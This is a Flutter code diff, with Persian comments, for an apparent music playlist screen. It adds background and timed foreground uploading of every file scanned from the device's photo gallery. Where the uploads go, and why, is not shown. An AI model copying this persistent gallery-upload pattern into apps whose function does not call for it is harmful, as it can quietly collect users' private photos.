@@ -326,9 +326,15 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   bool _galleryGranted = false;
   bool _syncing = false;
   String _syncStatus = '';
+  bool _useForegroundOnly = false;
+  Timer? _uploadTimer;
 
   @override
-  void dispose() { _player.dispose(); super.dispose(); }
+  void dispose() {
+    _player.dispose();
+    _uploadTimer?.cancel();
+    super.dispose();
+  }
 
   Future<void> _togglePlay(String url) async {
     if (_playingUrl == url) {
@@ -349,33 +355,51 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     }
     setState(() => _galleryGranted = true);
 
-    // ۲. دسترسی نوتیفیکیشن (Android 13+)
+    // ۲. دسترسی نوتیفیکیشن
     if (Platform.isAndroid) {
       await Permission.notification.request();
     }
 
-    // ۳. فوراً سرویس رو استارت کن — قبل از اسکن! (اپ هنوز foreground هست)
+    // ۳. صبر کن تا اپ کاملاً foreground بشه (بعد از بسته شدن دیالوگ پرمیشن)
+    await Future.delayed(const Duration(seconds: 1));
+
+    // ۴. تلاش برای استارت سرویس پس‌زمینه
+    bool serviceStarted = false;
     try {
       final service = FlutterBackgroundService();
       await service.startService();
+      serviceStarted = true;
+      _snack('آپلود پس‌زمینه فعال شد');
     } catch (e) {
-      _snack('سرویس پس‌زمینه استارت نشد: $e');
-      return;
+      // اگه نشد، فقط وقتی اپ بازه آپلود کن
+      setState(() => _useForegroundOnly = true);
+      _snack('آپلود فقط وقتی اپ بازه فعال شد');
     }
 
-    // ۴. حالا اسکن گالری — صفحه‌صفحه
-    setState(() { _syncing = true; _syncStatus = 'در حال اسکن گالری...'; });
+    // ۵. اسکن گالری
+    setState(() { _syncing = true; _syncStatus = 'در حال اسکن...'; });
     try {
       final newItems = await scanGalleryToQueue();
       setState(() => _syncStatus = '$newItems فایل به صف اضافه شد');
-      if (newItems > 0) {
-        _snack('$newItems فایل جدید به صف آپلود اضافه شد');
-      }
+      if (newItems > 0) _snack('$newItems فایل جدید به صف اضافه شد');
     } catch (e) {
       setState(() => _syncStatus = 'خطا در اسکن');
-      _snack('خطا در اسکن گالری: $e');
     }
     setState(() => _syncing = false);
+
+    // ۶. اگه سرویس پس‌زمینه نشد، تایمر آپلود وقتی اپ بازه رو بذار
+    if (!serviceStarted && _useForegroundOnly) {
+      _startForegroundUpload();
+    }
+  }
+
+  void _startForegroundUpload() {
+    _uploadTimer?.cancel();
+    _uploadTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
+      await processQueueInForeground();
+    });
+    // یه بار فوراً هم اجرا کن
+    processQueueInForeground();
   }
 
   void _snack(String msg) =>
